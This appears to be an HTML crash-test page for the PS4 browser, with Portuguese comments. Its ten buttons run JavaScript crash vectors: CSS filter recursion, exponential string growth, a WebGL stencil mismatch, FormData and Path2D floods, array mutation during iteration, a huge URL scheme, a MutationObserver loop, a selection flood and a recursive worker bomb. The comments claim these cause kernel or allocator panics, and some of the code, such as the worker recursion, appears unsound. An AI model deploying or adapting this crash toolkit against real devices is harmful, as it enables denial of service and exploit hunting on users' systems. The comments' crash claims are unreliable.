
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Deep JSON Analysis Suite v13000</title>
</head>
<body>

<h1>SUITE V13000: DEEP JSON ANALYSIS VECTORS</h1>
<p>Status: Critical. Target: Stack Exhaustion & OOM Panic.</p>
<hr>

<button onclick="crashCSSFilterStack()">01. CSS Filter Recursion Stack Overflow (RenderLayer Crash)</button>

<button onclick="crashStringReplaceOOM()">02. String Replace Exponential Growth (Allocator Panic)</button>

<button onclick="crashWebGLStencilMismatch()">03. WebGL Stencil/Depth Attachment Mismatch (GPU Panic)</button>

<button onclick="crashFormDataFlood()">04. FormData Multipart Parser Buffer Overflow</button>

<button onclick="crashPath2DWinding()">05. Path2D 'addPath' Recursive Winding (Graphics Stack Overflow)</button>

<button onclick="crashReduceRightMutation()">06. Array.reduceRight Mutation Race (JSC Index Error)</button>

<button onclick="crashURLParser()">07. URL Parser Buffer Overflow via Huge Scheme</button>

<button onclick="crashClassListToggle()">08. ClassList.toggle Recursion (DOM Update Loop)</button>

<button onclick="crashSelectionFlooding()">09. Selection AddRange Memory Exhaustion</button>

<button onclick="crashNestedWorkerBomb()">10. Nested Worker Recursive Spawn (Kernel Process Limit)</button>

<div id="log"></div>

<script>
    function log(msg) {
        document.getElementById('log').innerText += "\n" + msg;
    }

    // 01. CSS Filter Recursion Stack Overflow
    // Símbolo: WebCore::RenderLayer::updateLayerPositions
    function crashCSSFilterStack() {
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        // Cria uma string de filtro CSS absurdamente longa e aninhada
        // O parser e o renderer tentam processar isso recursivamente
        let filter = "drop-shadow(0 0 1px red) ";
        for(let i=0; i<5000; i++) {
            filter += "drop-shadow(0 0 1px red) ";
        }
        
        try {
            div.style.filter = filter;
            // Força o cálculo de layout acessando offsetHeight
            const forceLayout = div.offsetHeight; 
        } catch(e) {}
    }

    // 02. String Replace Exponential Growth
    // Símbolo: JSC::JSString::replace
    function crashStringReplaceOOM() {
        let str = "a";
        // Crescimento exponencial rápido
        // Tenta alocar gigabytes de string em segundos
        // PS4 tem memória limitada para Userland, isso deve causar Panic no alocador
        try {
            for(let i=0; i<32; i++) {
                str = str.replace(/a/g, "aa"); 
                // Se o replace for otimizado (Rope), a leitura força 'flattening'
                if (i % 5 === 0) {
                    const char = str.charAt(str.length - 1);
                }
            }
        } catch(e) {}
    }

    // 03. WebGL Stencil/Depth Attachment Mismatch
    // Símbolo: sceGnmDriver::setDepthStencil
    function crashWebGLStencilMismatch() {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        
        const fb = gl.createFramebuffer();
        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
        
        const rboColor = gl.createRenderbuffer();
        gl.bindRenderbuffer(gl.RENDERBUFFER, rboColor);
        gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA4, 100, 100);
        gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, rboColor);
        
        // Cria um buffer de Stencil com tamanho DIFERENTE do buffer de Cor
        // Drivers antigos crasham ao tentar calcular a interseção das áreas
        const rboStencil = gl.createRenderbuffer();
        gl.bindRenderbuffer(gl.RENDERBUFFER, rboStencil);
        gl.renderbufferStorage(gl.RENDERBUFFER, gl.STENCIL_INDEX8, 2048, 2048); // Tamanho mismatch
        gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.STENCIL_ATTACHMENT, gl.RENDERBUFFER, rboStencil);
        
        try {
            gl.clear(gl.COLOR_BUFFER_BIT | gl.STENCIL_BUFFER_BIT);
            gl.drawArrays(gl.POINTS, 0, 1);
            gl.finish();
        } catch(e) {}
    }

    // 04. FormData Multipart Parser Buffer Overflow
    // Símbolo: WebCore::FormDataBuilder
    function crashFormDataFlood() {
        const fd = new FormData();
        
        // Adiciona milhares de campos pequenos
        // O construtor de multipart/form-data tenta criar boundaries únicos
        // O buffer interno pode estourar ao serializar
        for(let i=0; i<50000; i++) {
            fd.append("field" + i, "value");
        }
        
        // Tenta enviar via XHR para forçar a serialização no kernel network stack
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "/crash");
        try {
            xhr.send(fd);
        } catch(e) {}
    }

    // 05. Path2D 'addPath' Recursive Winding
    // Símbolo: WebCore::Path::addPath
    function crashPath2DWinding() {
        const p1 = new Path2D();
        p1.rect(0,0,10,10);
        
        let pFinal = new Path2D();
        
        // Adiciona o mesmo caminho milhares de vezes com transformações
        // Isso cria uma lista de comandos gráficos enorme para o driver processar
        try {
            for(let i=0; i<10000; i++) {
                const matrix = document.createElementNS("http://www.w3.org/2000/svg", "svg").createSVGMatrix();
                pFinal.addPath(p1, matrix);
            }
            
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            // Rasterizar isso pode estourar a stack do driver gráfico
            ctx.fill(pFinal, "evenodd");
        } catch(e) {}
    }

    // 06. Array.reduceRight Mutation Race
    // Símbolo: JSC::ArrayPrototype::reduceRight
    function crashReduceRightMutation() {
        const arr = [0, 1, 2, 3, 4];
        
        try {
            arr.reduceRight((acc, val, idx, theArr) => {
                // Mutação destrutiva durante a iteração reversa
                if (idx === 2) {
                    theArr.length = 0; // Zera o array
                    // Tenta confundir o iterador interno do JSC
                    // O motor C++ pode ter cached o ponteiro do buffer
                    for(let k=0; k<1000; k++) theArr.push(1.1); 
                }
                return acc + val;
            });
        } catch(e) {}
    }

    // 07. URL Parser Buffer Overflow via Huge Scheme
    // Símbolo: WebCore::URLParser
    function crashURLParser() {
        // Tenta criar uma URL com um esquema (protocolo) maior que o buffer de stack (geralmente 4KB)
        let hugeScheme = "A".repeat(10000);
        let urlString = hugeScheme + "://google.com";
        
        try {
            // O parser tenta validar o esquema
            new URL(urlString);
            
            // Se passar, tenta atribuir ao location (processamento extra)
            window.history.pushState({}, "", urlString);
        } catch(e) {}
    }

    // 08. ClassList.toggle Recursion (DOM Update Loop)
    // Símbolo: WebCore::DOMTokenList
    function crashClassListToggle() {
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        // Observer que reage a mudanças de atributo
        const obs = new MutationObserver(() => {
            // Se a classe mudou, muda de novo!
            // Loop síncrono infinito que consome stack
            try {
                div.classList.toggle("crash");
            } catch(e) {}
        });
        
        obs.observe(div, {attributes: true});
        
        // Trigger inicial
        div.classList.add("start");
    }

    // 09. Selection AddRange Memory Exhaustion
    // Símbolo: WebCore::Selection::addRange
    function crashSelectionFlooding() {
        const sel = window.getSelection();
        const root = document.createElement('div');
        document.body.appendChild(root);
        
        // Cria milhares de ranges
        // O Firefox/WebKit geralmente tem limite, mas se o limite for alto, consome muita RAM
        try {
            for(let i=0; i<10000; i++) {
                const p = document.createElement('p');
                root.appendChild(p);
                const range = document.createRange();
                range.selectNode(p);
                sel.addRange(range);
            }
        } catch(e) {}
    }

    // 10. Nested Worker Bomb
    // Símbolo: Kernel::sys_fork / sys_kthread_create
    function crashNestedWorkerBomb() {
        // Código do worker que cria outro worker recursivamente
        // O PS4 tem um limite rígido de threads/processos. Atingir esse limite rápido causa panic.
        const workerCode = `
            try {
                const blob = new Blob(["(" + arguments.callee.toString() + ")()"], {type: "text/javascript"});
                const url = URL.createObjectURL(blob);
                new Worker(url);
                new Worker(url); // Bifurcação (2^n)
            } catch(e) {}
        `;
        
        const blob = new Blob([workerCode], {type: "text/javascript"});
        new Worker(URL.createObjectURL(blob));
    }
</script>

</body>
</html>
